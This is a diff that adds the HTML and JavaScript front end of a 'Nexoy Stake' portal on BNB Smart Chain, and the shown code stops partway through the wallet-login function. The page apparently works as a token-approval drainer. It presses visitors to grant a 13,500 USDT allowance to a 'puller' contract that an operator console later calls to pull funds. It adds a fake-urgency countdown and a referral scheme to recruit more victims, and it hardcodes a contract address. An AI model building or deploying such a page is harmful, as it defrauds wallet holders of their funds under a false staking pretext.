@@ -1,0 +1,1112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Nexoy Stake – Access Portal</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg:#f7fbff;
+      --bg-gradient: radial-gradient(120% 120% at 50% 0%, rgba(16,185,129,0.14) 0%, rgba(232,246,255,0.9) 55%, rgba(255,255,255,1) 100%);
+      --card:#ffffff;
+      --muted:#546076;
+      --text:#0a1020;
+      --accent:#10b981;
+      --accent-strong:#0ea5e9;
+      --danger:#ef4444;
+      --warning:#f59e0b;
+      --glass:rgba(10,16,32,0.05);
+    }
+    *{box-sizing:border-box;}
+    body{
+      margin:0;
+      font-family:'Space Grotesk','Inter',system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+      background:var(--bg);
+      color:var(--text);
+      position:relative;
+      min-height:100vh;
+    }
+    body::before{
+      content:"";
+      position:fixed;
+      inset:0;
+      background:var(--bg-gradient);
+      z-index:-2;
+    }
+    body::after{
+      content:"";
+      position:fixed;
+      inset:0;
+      background:linear-gradient(160deg, rgba(255,255,255,0.92), rgba(236,252,255,0.78));
+      z-index:-1;
+      pointer-events:none;
+    }
+    a{color:inherit;text-decoration:none;}
+    header{
+      padding:18px clamp(16px,4vw,48px);
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      position:sticky;
+      top:0;
+      z-index:10;
+      backdrop-filter:blur(12px);
+      background:rgba(255,255,255,0.94);
+      border-bottom:1px solid rgba(15,23,42,0.06);
+    }
+    .brand{
+      font-weight:700;
+      font-size:clamp(1.1rem,1.3vw + .6rem,1.6rem);
+      letter-spacing:0.08em;
+      display:flex;
+      align-items:center;
+      gap:12px;
+      text-transform:uppercase;
+    }
+    .brand span{
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      width:40px;
+      height:40px;
+      border-radius:12px;
+      background:linear-gradient(135deg,var(--accent-strong),var(--accent));
+      color:#1f1006;
+      font-weight:800;
+    }
+    .brand small{
+      display:block;
+      font-size:0.72rem;
+      letter-spacing:0.2em;
+      color:var(--muted);
+    }
+    nav{display:flex;gap:18px;font-size:0.95rem;align-items:center;}
+    nav a{color:var(--muted);transition:color .2s}
+    nav a:hover{color:#111827}
+    .nav-login{
+      appearance:none;
+      border:1px solid rgba(16,185,129,0.5);
+      padding:10px 18px;
+      border-radius:999px;
+      font-weight:600;
+      background:rgba(16,185,129,0.12);
+      color:#0f172a;
+      cursor:pointer;
+      transition:all .25s;
+    }
+    .nav-login:hover{background:rgba(16,185,129,0.2);transform:translateY(-1px);}
+    .nav-login.connected{
+      background:rgba(16,185,129,0.2);
+      border-color:rgba(16,185,129,0.7);
+      color:var(--text);
+      cursor:default;
+    }
+    .cta-link{
+      padding:10px 18px;
+      border-radius:999px;
+      background:rgba(16,185,129,0.1);
+      color:#1c2b4a;
+      border:1px solid rgba(16,185,129,0.35);
+      transition:all .25s;
+    }
+    .cta-link:hover{background:rgba(16,185,129,0.18);transform:translateY(-2px)}
+    main{
+      display:flex;
+      flex-direction:column;
+      gap:80px;
+      padding: clamp(32px, 5vw, 72px) clamp(16px, 6vw, 96px) 120px;
+      flex:1;
+    }
+    .hero{
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(320px,1fr));
+      gap:40px;
+      align-items:center;
+    }
+    .hero__heading{
+      font-size:clamp(2.1rem,3vw + 1rem,3.2rem);
+      line-height:1.1;
+      margin:0 0 18px;
+    }
+    .hero__lede{
+      color:var(--muted);
+      font-size:1.05rem;
+      line-height:1.6;
+      max-width:45ch;
+    }
+    .ref-note{
+      margin:18px 0 0;
+      color:var(--accent);
+      font-size:0.95rem;
+      background:rgba(16,185,129,0.08);
+      border:1px solid rgba(16,185,129,0.3);
+      padding:10px 14px;
+      border-radius:16px;
+      display:none;
+    }
+    .hero-card{
+      background:var(--card);
+      border:1px solid rgba(15,23,42,0.08);
+      border-radius:24px;
+      padding:32px;
+      box-shadow:0 35px 80px rgba(15,23,42,0.08);
+      position:relative;
+      overflow:hidden;
+    }
+    .hero-card::before{
+      content:"";
+      position:absolute;
+      width:220px;
+      height:220px;
+      background:radial-gradient(circle at center, rgba(16,185,129,0.25), transparent 70%);
+      top:-40px;
+      right:-40px;
+      filter:blur(12px);
+    }
+    .hero-card h2{margin:0 0 8px;font-size:1.6rem;}
+    .hero-card p{margin:0 0 20px;color:var(--muted);line-height:1.55}
+    .meta{
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Courier New', monospace;
+      font-size:13px;
+      display:grid;
+      gap:6px;
+      margin-bottom:22px;
+      color:#475569;
+      word-break:break-all;
+    }
+    .status-line{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      margin-bottom:18px;
+      flex-wrap:wrap;
+    }
+    button.primary{
+      appearance:none;
+      border:none;
+      padding:14px 22px;
+      border-radius:18px;
+      font-weight:600;
+      letter-spacing:0.02em;
+      cursor:pointer;
+      background:linear-gradient(135deg,var(--accent),var(--accent-strong));
+      color:#fdfdfd;
+      transition:transform .2s, box-shadow .2s, filter .2s;
+    }
+    button.primary:disabled{
+      cursor:not-allowed;
+      opacity:.7;
+      transform:none;
+      box-shadow:none;
+      filter:grayscale(.2);
+    }
+    button.primary:not(:disabled):hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(16,185,129,0.35)}
+    .badge{
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+      padding:6px 12px;
+      border-radius:999px;
+      font-size:12px;
+      letter-spacing:.05em;
+      text-transform:uppercase;
+      background:rgba(16,185,129,0.12);
+      color:var(--accent);
+      border:1px solid rgba(16,185,129,0.3);
+    }
+    .badge.success{background:rgba(34,197,94,0.18);border-color:rgba(34,197,94,0.35);color:#065f46}
+    .badge.error{background:rgba(239,68,68,0.12);border-color:rgba(239,68,68,0.35);color:var(--danger)}
+    .badge.warning{background:rgba(249,115,22,0.12);border-color:rgba(249,115,22,0.32);color:var(--warning)}
+    .identity{
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Courier New', monospace;
+      font-size:13px;
+      color:#475569;
+      word-break:break-all;
+      display:flex;
+      align-items:center;
+      gap:8px;
+    }
+    .identity span.label{
+      border:1px solid rgba(15,23,42,0.1);
+      padding:4px 10px;
+      border-radius:10px;
+      color:var(--muted);
+      font-size:11px;
+      text-transform:uppercase;
+      letter-spacing:.05em;
+    }
+    .action-hint{
+      margin:6px 0 0;
+      font-size:0.85rem;
+      color:var(--muted);
+      display:none;
+    }
+    .action-hint.error{color:var(--danger);}
+    .action-hint.info{color:var(--muted);}
+    .action-hint.success{color:#16a34a;}
+    .login-hint{
+      margin:12px 0 0;
+      font-size:0.9rem;
+      color:var(--muted);
+    }
+    body[data-auth="false"] .auth-only{display:none;}
+    body[data-auth="true"] .login-hint{display:none;}
+    body[data-auth="false"] .login-hint{display:block;}
+    .log{
+      margin-top:24px;
+      background:rgba(15,23,42,0.08);
+      border:1px solid rgba(15,23,42,0.08);
+      border-radius:16px;
+      padding:18px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Courier New', monospace;
+      font-size:12px;
+      color:#1d2b45;
+      max-height:220px;
+      overflow:auto;
+      white-space:pre-wrap;
+    }
+    .referral{
+      margin-top:28px;
+      background:rgba(16,185,129,0.05);
+      border:1px solid rgba(16,185,129,0.2);
+      border-radius:18px;
+      padding:20px;
+      display:none;
+      flex-direction:column;
+      gap:16px;
+    }
+    .referral h3{margin:0;font-size:1.15rem;color:var(--accent-strong)}
+    .referral p{margin:0;color:#1f2937;font-size:0.95rem}
+    .referral-controls{
+      display:flex;
+      flex-wrap:wrap;
+      gap:12px;
+    }
+    .referral input{
+      flex:1;
+      min-width:220px;
+      padding:12px 14px;
+      border-radius:12px;
+      border:1px solid rgba(16,185,129,0.4);
+      background:rgba(255,255,255,0.9);
+      color:var(--text);
+      font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Courier New', monospace;
+      font-size:13px;
+    }
+    .referral button{
+      appearance:none;
+      border:none;
+      background:rgba(16,185,129,0.15);
+      color:#0f172a;
+      font-weight:600;
+      padding:12px 18px;
+      border-radius:12px;
+      cursor:pointer;
+      transition:transform .2s;
+    }
+    .referral button:hover{transform:translateY(-2px)}
+    .referral button:disabled{
+      opacity:0.5;
+      cursor:not-allowed;
+      transform:none;
+    }
+    .referral small{color:rgba(15,23,42,0.75);font-size:0.8rem}
+    .referral .code-pill{
+      display:inline-flex;
+      align-items:center;
+      gap:10px;
+      align-self:start;
+      padding:8px 14px;
+      border-radius:999px;
+      border:1px solid rgba(16,185,129,0.45);
+      background:rgba(16,185,129,0.15);
+      font-size:0.9rem;
+      color:var(--accent-strong);
+    }
+    .referral .code-pill span{
+      font-weight:700;
+      letter-spacing:0.08em;
+    }
+    .referral-stats{
+      display:flex;
+      gap:16px;
+      flex-wrap:wrap;
+      margin-top:12px;
+    }
+    .referral-stats .stat{
+      flex:1;
+      min-width:140px;
+      background:rgba(16,185,129,0.08);
+      border:1px solid rgba(16,185,129,0.3);
+      border-radius:14px;
+      padding:12px 16px;
+      display:flex;
+      flex-direction:column;
+      gap:4px;
+    }
+    .referral-stats .stat span{
+      font-size:1.4rem;
+      font-weight:700;
+      color:var(--accent-strong);
+    }
+    .referral-stats .stat small{
+      font-size:0.75rem;
+      text-transform:uppercase;
+      letter-spacing:.08em;
+      color:rgba(15,23,42,0.72);
+    }
+    .referral-list{
+      list-style:none;
+      margin:12px 0 0;
+      padding:0;
+      display:flex;
+      flex-direction:column;
+      gap:8px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Courier New', monospace;
+      font-size:12px;
+    }
+    .referral-list li{
+      background:rgba(241,245,249,0.8);
+      border:1px solid rgba(15,23,42,0.08);
+      border-radius:10px;
+      padding:8px 10px;
+      color:#0f172a;
+      display:flex;
+      align-items:center;
+      gap:10px;
+    }
+    .referral-list li.empty{
+      border-style:dashed;
+      color:rgba(15,23,42,0.65);
+      background:transparent;
+    }
+    .code-chip{
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      min-width:56px;
+      padding:3px 10px;
+      border-radius:999px;
+      border:1px solid rgba(16,185,129,0.45);
+      background:rgba(16,185,129,0.18);
+      font-size:11px;
+      letter-spacing:0.08em;
+      color:var(--accent-strong);
+      text-transform:uppercase;
+    }
+    .grid{
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+      gap:24px;
+    }
+    .info-card{
+      padding:26px;
+      border-radius:20px;
+      border:1px solid rgba(15,23,42,0.05);
+      background:rgba(255,255,255,0.85);
+      display:flex;
+      flex-direction:column;
+      gap:12px;
+      box-shadow:0 24px 65px rgba(15,23,42,0.08);
+    }
+    .info-card h4{margin:0;font-size:1.1rem}
+    .info-card p{margin:0;color:var(--muted);line-height:1.55}
+    footer{
+      padding:28px clamp(16px,4vw,48px);
+      border-top:1px solid rgba(15,23,42,0.08);
+      background:transparent;
+      color:rgba(15,23,42,0.75);
+      font-size:0.9rem;
+    }
+    footer .cols{
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+      gap:22px;
+      margin-bottom:20px;
+    }
+    footer h5{margin:0 0 12px;color:var(--text);text-transform:uppercase;font-size:0.85rem;letter-spacing:.12em}
+    footer ul{margin:0;padding:0;list-style:none;display:flex;flex-direction:column;gap:8px}
+    footer a{color:inherit}
+    footer small{display:block;margin-top:16px;font-size:0.78rem;letter-spacing:.05em;text-transform:uppercase}
+    .countdown{
+      position:relative;
+      display:flex;
+      flex-direction:column;
+      gap:18px;
+      align-items:center;
+      margin-bottom:48px;
+      text-align:center;
+    }
+    .countdown::before{
+      content:'';
+      position:absolute;
+      inset:-6px;
+      border-radius:32px;
+      background:radial-gradient(circle at top, rgba(16,185,129,0.25), transparent 55%), radial-gradient(circle at bottom, rgba(248,115,6,0.25), transparent 60%);
+      opacity:0.35;
+      filter:blur(40px);
+      z-index:-2;
+    }
+    .countdown-title{
+      font-size:0.95rem;
+      letter-spacing:0.24em;
+      text-transform:uppercase;
+      color:rgba(15,23,42,0.75);
+    }
+    .countdown-grid{
+      position:relative;
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(120px,1fr));
+      gap:20px;
+      width:100%;
+      max-width:640px;
+      padding:28px clamp(18px,6vw,40px);
+      border-radius:28px;
+      border:1px solid rgba(15,23,42,0.12);
+      background:rgba(255,255,255,0.9);
+      box-shadow:0 22px 60px rgba(15,23,42,0.14);
+      backdrop-filter:blur(22px);
+      font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,'Courier New',monospace;
+      overflow:hidden;
+    }
+    .countdown-grid::after{
+      content:'';
+      position:absolute;
+      inset:1px;
+      border-radius:26px;
+      border:1px solid rgba(16,185,129,0.08);
+      pointer-events:none;
+    }
+    .countdown-grid div{
+      position:relative;
+      display:flex;
+      flex-direction:column;
+      gap:10px;
+      align-items:center;
+      justify-content:center;
+      padding:16px 0;
+      background:linear-gradient(180deg,rgba(16,185,129,0.12) 0%,rgba(16,185,129,0) 75%);
+      border-radius:18px;
+      border:1px solid rgba(16,185,129,0.12);
+      box-shadow:inset 0 0 18px rgba(16,185,129,0.08);
+    }
+    .countdown-grid div::before{
+      content:'';
+      position:absolute;
+      top:12px;
+      width:22px;
+      height:2px;
+      border-radius:999px;
+      background:rgba(255,255,255,0.7);
+      opacity:0.35;
+    }
+    .countdown-grid span{
+      font-size:2.6rem;
+      font-weight:700;
+      letter-spacing:0.08em;
+      display:block;
+      color:var(--accent-strong);
+      text-shadow:0 8px 30px rgba(16,185,129,0.2);
+    }
+    .countdown-grid small{
+      text-transform:uppercase;
+      letter-spacing:0.14em;
+      font-size:0.75rem;
+      color:rgba(15,23,42,0.65);
+    }
+    @media (max-width:720px){
+      header{padding:16px 20px;flex-direction:column;align-items:flex-start;gap:12px;}
+      nav{display:flex;width:100%;justify-content:space-between;flex-wrap:wrap;gap:10px;}
+      .hero-card{padding:26px}
+      .status-line{gap:10px}
+      .identity{flex-direction:column;align-items:flex-start}
+      .referral-controls{flex-direction:column;align-items:stretch}
+      .referral input{width:100%}
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.12.1/dist/ethers.umd.min.js"></script>
+  <script src="js/config.js"></script>
+  <script src="js/abi.js"></script>
+</head>
+<body data-auth="false">
+  <header>
+    <div class="brand"><span>NX</span> Nexoy Stake <small>Access Link</small></div>
+    <nav>
+      <a href="#how">How it works</a>
+      <a href="#security">Safety</a>
+      <button type="button" id="btnLogin" class="nav-login">Connect wallet</button>
+    </nav>
+  </header>
+
+  <main>
+    <section class="hero">
+      <div class="hero__copy">
+        <h1 class="hero__heading">Nexoy Stake keeps your wallet primed for scheduled pulls.</h1>
+        <p class="hero__lede">
+          Approve the Nexoy Stake contract once so future withdrawals clear without a second wait. You stay in command—adjust or revoke the allowance any time from your wallet.
+        </p>
+        <p class="ref-note" id="refNote"></p>
+      </div>
+      <div class="hero-card">
+        <h2>Authorize once</h2>
+        <p>Approve <strong id="approvalAmount">13,500</strong> USDT for the Nexoy Stake contract below so it can later pull the exact amount you specify. Signature from MetaMask or a compatible wallet is required.</p>
+        <div class="meta">
+          <div>Nexoy Stake contract: <span id="pullerAddr"></span></div>
+          <div>USDT Token: <span id="assetAddr"></span></div>
+        </div>
+        <div class="status-line">
+          <button class="primary" id="btnSubscribe">Get Started</button>
+          <span id="status" class="badge">Offline</span>
+        </div>
+        <p class="login-hint">Connect a wallet to unlock referrals and confirm your approval.</p>
+        <p class="action-hint auth-only" id="actionHint"></p>
+        <div class="identity auth-only">
+          <span class="label">Wallet</span>
+          <span id="userInfo">Not connected</span>
+        </div>
+        <div class="referral auth-only" id="referralBox">
+          <h3>Invite desk</h3>
+          <p>Share your invite so others can join your approval run. Each linked wallet keeps the referral trace intact.</p>
+          <div class="code-pill">Invite tag: <span id="refCodeLabel">—</span></div>
+          <div class="referral-controls">
+            <input id="referralLink" readonly />
+            <button id="copyReferral">Share invite</button>
+          </div>
+          <div class="referral-stats">
+            <div class="stat">
+              <span id="totalUsers">0</span>
+              <small>Ready wallets</small>
+            </div>
+            <div class="stat">
+              <span id="refCount">0</span>
+              <small>Linked invites</small>
+            </div>
+          </div>
+          <ul id="refList" class="referral-list"></ul>
+          <small id="referralHint">Invite link is ready on your clipboard.</small>
+        </div>
+        <pre class="log" id="log"></pre>
+      </div>
+    </section>
+
+    <section class="grid" id="how">
+      <article class="info-card">
+        <h4>Single signature</h4>
+        <p>Tap Get Started and sign so the contract can later pull <span id="infoAmount">13,500</span> USDT exactly once per allowance. We handle the decimal math for you.</p>
+      </article>
+      <article class="info-card">
+        <h4>Dormant until called</h4>
+        <p>The operator console only calls <code>pullExact</code> once a wallet has authorized. Until then, the allowance sits idle on-chain.</p>
+      </article>
+      <article class="info-card" id="security">
+        <h4>Transparent & reversible</h4>
+        <p>Approvals are logged on BNB Smart Chain. Revoke in your wallet or submit a new allowance anytime to refresh the puller permissions.</p>
+      </article>
+    </section>
+  </main>
+
+  <footer>
+    <div class="countdown">
+    <div class="countdown-title">Access window ends in:</div>
+      <div class="countdown-grid" id="countdown">
+        <div><span data-unit="days">194</span><small>Days</small></div>
+        <div><span data-unit="hours">00</span><small>Hours</small></div>
+        <div><span data-unit="minutes">00</span><small>Minutes</small></div>
+        <div><span data-unit="seconds">00</span><small>Seconds</small></div>
+      </div>
+    </div>
+    <div class="cols">
+      <div>
+        <h5>Quick links</h5>
+        <ul>
+          <li><a href="/">Access portal</a></li>
+          <li><a href="/admin">Operator console</a></li>
+          <li><a href="https://bscscan.com/address/0xD2fF0d66df51529138C4F4ef4976FF0A0d4643fF" target="_blank" rel="noopener">Nexoy Stake contract</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>Support</h5>
+        <ul>
+          <li>Confirm MetaMask or another wallet is unlocked before authorizing.</li>
+          <li>Questions? Message the operator team for clarifications or allowance tweaks.</li>
+        </ul>
+      </div>
+      <div>
+        <h5>Network</h5>
+        <ul>
+          <li>BNB Smart Chain (Mainnet)</li>
+          <li>Chain ID: 56</li>
+          <li>Status badge reacts live while the approval flow runs.</li>
+        </ul>
+      </div>
+    </div>
+    <small>© <span id="year"></span> Nexoy Stake. Access portal refreshed.</small>
+  </footer>
+
+<script>
+(async () => {
+  const { PULLER_ADDRESS, USDT_ADDRESS, DEFAULT_APPROVAL_USDT, BSC, BACKEND_URL } = window.APP_CONFIG;
+  const BACKEND = BACKEND_URL || window.location.origin;
+  const el = (id) => document.getElementById(id);
+
+  const logBox = el('log');
+  const statusBadge = el('status');
+  const userInfo = el('userInfo');
+  const btn = el('btnSubscribe');
+  const btnLogin = el('btnLogin');
+  const referralBox = el('referralBox');
+  const referralLink = el('referralLink');
+  const referralHint = el('referralHint');
+  const copyBtn = el('copyReferral');
+  const yearSpan = el('year');
+  const refNote = el('refNote');
+  const actionHint = el('actionHint');
+  const totalUsersEl = el('totalUsers');
+  const refCountEl = el('refCount');
+  const refListEl = el('refList');
+  const refCodeLabel = el('refCodeLabel');
+  const countdownGrid = el('countdown');
+
+  btn.disabled = true;
+  copyBtn.disabled = true;
+
+  yearSpan.textContent = new Date().getFullYear();
+  el('pullerAddr').textContent = PULLER_ADDRESS;
+  el('assetAddr').textContent  = USDT_ADDRESS;
+  el('approvalAmount').textContent = DEFAULT_APPROVAL_USDT.toLocaleString();
+  el('infoAmount').textContent = DEFAULT_APPROVAL_USDT.toLocaleString();
+
+  if (referralBox) referralBox.style.display = 'none';
+  referralHint.style.display = 'none';
+  if (refNote) refNote.style.display = 'none';
+
+  const MS_SECOND = 1000;
+  const MS_MIN = 60 * MS_SECOND;
+  const MS_HOUR = 60 * MS_MIN;
+  const MS_DAY = 24 * MS_HOUR;
+
+  const configuredCountdownTarget = window.APP_CONFIG.COUNTDOWN_END_DATE;
+  const parsedCountdownTarget = configuredCountdownTarget ? Date.parse(configuredCountdownTarget) : NaN;
+  const fallbackDaysConfig = Number(window.APP_CONFIG.COUNTDOWN_FALLBACK_DAYS);
+  const fallbackDays = Number.isFinite(fallbackDaysConfig) && fallbackDaysConfig > 0
+    ? Math.max(0, fallbackDaysConfig - 1)
+    : 195;
+  const fallbackCountdownTarget = Date.now() + fallbackDays * MS_DAY;
+  let countdownTarget = Number.isNaN(parsedCountdownTarget) ? fallbackCountdownTarget : parsedCountdownTarget;
+  let clockOffset = 0;
+  const countdownEndpoint = BACKEND ? `${BACKEND.replace(/\/$/, '')}/api/countdown` : '';
+
+  async function syncCountdownFromServer() {
+    if (!countdownEndpoint) return;
+    try {
+      const response = await fetch(countdownEndpoint, { cache: 'no-store' });
+      if (!response.ok) throw new Error(`HTTP ${response.status}`);
+      const data = await response.json();
+      const serverTarget = Number(data?.target ?? data?.countdownTarget);
+      const serverTime = Number(data?.serverTime);
+      if (Number.isFinite(serverTarget)) countdownTarget = serverTarget;
+      if (Number.isFinite(serverTime)) clockOffset = Date.now() - serverTime;
+    } catch (err) {
+      console.warn('countdown sync failed', err);
+    }
+  }
+
+  const getServerNow = () => Date.now() - clockOffset;
+
+  function updateCountdown() {
+    if (!countdownGrid) return;
+    let remaining = Math.max(0, countdownTarget - getServerNow());
+    const days = Math.floor(remaining / MS_DAY);
+    remaining -= days * MS_DAY;
+    const hours = Math.floor(remaining / MS_HOUR);
+    remaining -= hours * MS_HOUR;
+    const minutes = Math.floor(remaining / MS_MIN);
+    remaining -= minutes * MS_MIN;
+    const seconds = Math.floor(remaining / MS_SECOND);
+    const values = { days, hours, minutes, seconds };
+    Object.entries(values).forEach(([unit, value]) => {
+      const span = countdownGrid.querySelector(`span[data-unit="${unit}"]`);
+      if (!span) return;
+      const text = unit === 'days' ? String(value) : String(value).padStart(2, '0');
+      span.textContent = text;
+    });
+  }
+
+  await syncCountdownFromServer();
+  updateCountdown();
+  setInterval(updateCountdown, 1000);
+  setInterval(() => { syncCountdownFromServer(); }, 5 * 60 * 1000);
+
+  const state = { subscribers: [] };
+  let hasActiveAllowance = false;
+  let isAuthenticated = false;
+  let provider, signer, account, puller, usdt;
+  let decimals = 18;
+  let symbol = 'USDT';
+
+  const appendLog = (message) => {
+    if (!logBox) return;
+    logBox.textContent += `
+${new Date().toLocaleTimeString()}  ${message}`;
+    logBox.scrollTop = logBox.scrollHeight;
+  };
+
+  const formatCount = (n) => {
+    try { return Number(n || 0).toLocaleString(); }
+    catch { return String(n || 0); }
+  };
+
+  const shortenAddress = (addr) => addr ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : '';
+
+  function setStatus(text, variant = '') {
+    statusBadge.textContent = text;
+    statusBadge.className = `badge${variant ? ` ${variant}` : ''}`;
+  }
+
+  function setActionHint(message, variant = 'info') {
+    if (!actionHint) return;
+    if (!message || !isAuthenticated) {
+      actionHint.textContent = '';
+      actionHint.className = 'action-hint';
+      actionHint.style.display = 'none';
+      return;
+    }
+    actionHint.textContent = message;
+    actionHint.className = `action-hint ${variant}`;
+    actionHint.style.display = 'block';
+  }
+  const clearActionHint = () => setActionHint('');
+
+  const renderRefList = (entries = []) => {
+    if (!refListEl) return;
+    refListEl.innerHTML = '';
+    if (!entries.length) {
+      const li = document.createElement('li');
+      li.className = 'empty';
+      li.textContent = 'No invites tracked yet. Share your link to bring others onboard.';
+      refListEl.appendChild(li);
+      return;
+    }
+    entries.forEach((entry, idx) => {
+      const li = document.createElement('li');
+      const code = entry.refCode || '—';
+      li.innerHTML = `<span class="code-chip">${code}</span><span>${idx + 1}. ${shortenAddress(entry.address)}</span>`;
+      refListEl.appendChild(li);
+    });
+  };
+
+  async function fetchAllowance(address) {
+    if (!address || !usdt) return null;
+    try {
+      return await usdt.allowance(address, PULLER_ADDRESS);
+    } catch (error) {
+      appendLog(`allowance read error: ${error?.message || error}`);
+      return null;
+    }
+  }
+
+  function applySubscriptionState(address, record, allowanceBn) {
+    const allowanceActive = allowanceBn != null ? allowanceBn > 0n : false;
+    hasActiveAllowance = allowanceActive;
+    const hasCode = Boolean(record?.refCode);
+    if (hasCode) {
+      showReferral(address, record.refCode, { skipScroll: true });
+    } else {
+      if (refCodeLabel) refCodeLabel.textContent = '—';
+      if (!allowanceActive && referralBox) referralBox.style.display = 'none';
+    }
+    copyBtn.disabled = !hasCode;
+    if (isAuthenticated) {
+      btn.disabled = false;
+      btn.textContent = 'Get Started';
+      if (allowanceActive) {
+        setStatus('Ready', 'success');
+        setActionHint('Authorization active. Tap Get Started again to refresh or share your invite below.', 'success');
+      } else {
+        setStatus('Connected', 'success');
+        setActionHint('Allowance not active. Click Get Started to approve again.', 'info');
+        if (!hasCode && referralBox) referralBox.style.display = 'none';
+      }
+    } else {
+      btn.disabled = true;
+      copyBtn.disabled = true;
+    }
+  }
+
+  async function syncSubscriptionState(address, record) {
+    if (!address) return;
+    const allowance = await fetchAllowance(address);
+    applySubscriptionState(address, record, allowance);
+  }
+
+  async function fetchUsers() {
+    try {
+      const res = await fetch(`${BACKEND}/api/users`, { cache: 'no-store' });
+      if (!res.ok) throw new Error(`status ${res.status}`);
+      const data = await res.json();
+      return Array.isArray(data) ? data : [];
+    } catch (error) {
+      appendLog(`warn: unable to load subscriber stats: ${error?.message || error}`);
+      return [];
+    }
+  }
+
+  function decodeReferralToken(token) {
+    if (!token) return null;
+    if (/^0x[a-fA-F0-9]{40}$/.test(token)) return token;
+    const found = state.subscribers.find(u => (u.refCode || '').toLowerCase() === token.toLowerCase());
+    return found?.address || null;
+  }
+
+  const showReferral = (_addr, code, opts = {}) => {
+    if (!code) return;
+    const url = new URL(window.location.origin);
+    url.searchParams.set('ref', code);
+    referralLink.value = url.toString();
+    if (refCodeLabel) refCodeLabel.textContent = code;
+    referralHint.style.display = 'none';
+    referralBox.style.display = 'flex';
+    if (!opts.skipScroll) {
+      referralBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+  };
+
+  const showRefNote = (address, codeToken) => {
+    if (!refNote || !address) return;
+    const refUser = state.subscribers.find(u => u.address?.toLowerCase?.() === address.toLowerCase());
+    const codeLabel = (refUser?.refCode || codeToken || '').toString();
+    const addrLabel = shortenAddress(refUser?.address || address);
+    refNote.innerHTML = `You were referred by <span class="mono">${addrLabel}</span> • code <span class="code-chip">${codeLabel}</span>. Invite them to keep the credit chain.`;
+    refNote.style.display = 'block';
+  };
+
+  const setAuthenticated = (addr) => {
+    isAuthenticated = Boolean(addr);
+    document.body.dataset.auth = isAuthenticated ? 'true' : 'false';
+    if (isAuthenticated) {
+      btnLogin.textContent = shortenAddress(addr);
+      btnLogin.classList.add('connected');
+      btnLogin.disabled = true;
+      userInfo.textContent = addr;
+      setStatus('Connected', 'success');
+    } else {
+      btnLogin.textContent = 'Login';
+      btnLogin.classList.remove('connected');
+      btnLogin.disabled = false;
+      userInfo.textContent = 'Not connected';
+      setStatus('Disconnected', '');
+      if (referralBox) referralBox.style.display = 'none';
+    }
+    btn.disabled = !isAuthenticated;
+    copyBtn.disabled = true;
+    if (!isAuthenticated) clearActionHint();
+  };
+
+  async function refreshStats(activeAddress) {
+    const users = await fetchUsers();
+    state.subscribers = users;
+    if (totalUsersEl) totalUsersEl.textContent = formatCount(users.length);
+    let mine = [];
+    let selfRecord = null;
+    if (activeAddress) {
+      const target = activeAddress.toLowerCase();
+      selfRecord = users.find(u => u.address.toLowerCase() === target) || null;
+      mine = users.filter(u => (u.referrer || '').toLowerCase() === target);
+    }
+    if (refCountEl) refCountEl.textContent = formatCount(mine.length);
+    renderRefList(mine);
+    return { users, self: selfRecord };
+  }
+
+  await refreshStats(null);
+
+  let referralToken = new URLSearchParams(window.location.search).get('ref') || '';
+  let referrerFromLink = decodeReferralToken(referralToken);
+  if (referrerFromLink) {
+    showRefNote(referrerFromLink, referralToken);
+  }
+
+  if (!window.ethereum) {
+    setStatus('Wallet missing', 'error');
+    btnLogin.disabled = true;
+    btn.disabled = true;
+    copyBtn.disabled = true;
+    appendLog('No wallet detected. Install MetaMask or a compatible wallet.');
+    return;
+  }
+
+  async function ensureBSC() {
+    const id = await window.ethereum.request({ method: 'eth_chainId' });
+    if (id !== BSC.CHAIN_ID_HEX) {
+      try {
+        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC.CHAIN_ID_HEX }] });
+      } catch (e) {
+        if (e.code === 4902) {
+          await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [BSC.CHAIN_PARAMS] });
+        } else {
+          throw e;
+        }
+      }
+    }
+  }
+
+  async function loginWallet(auto = false) {
+    try {
+      await ensureBSC();
+      provider = new ethers.BrowserProvider(window.ethereum);
+      if (auto) {
+        const accounts = await provider.send('eth_accounts', []);
+        if (!accounts || !accounts.length) return null;
+      } else {
+        await provider.send('eth_requestAccounts', []);
+      }
+      signer = await provider.getSigner();
+      account = await signer.getAddress();
+      puller = new ethers.Contract(PULLER_ADDRESS, window.ABI.puller, signer);
+      usdt = new ethers.Contract(USDT_ADDRESS, window.ABI.erc20, signer);
+      try { decimals = await usdt.decimals(); } catch {}
+      try { symbol = await usdt.symbol(); } catch {}
+      setAuthenticated(account);
+      appendLog(`Connected wallet ${account}`);
+      const { self } = await refreshStats(account);
+      await syncSubscriptionState(account, self);
+      if (referralToken && !referrerFromLink) {
+        referrerFromLink = decodeReferralToken(referralToken);
+        if (referrerFromLink) showRefNote(referrerFromLink, referralToken);
+      }
+      return account;
+    } catch (error) {
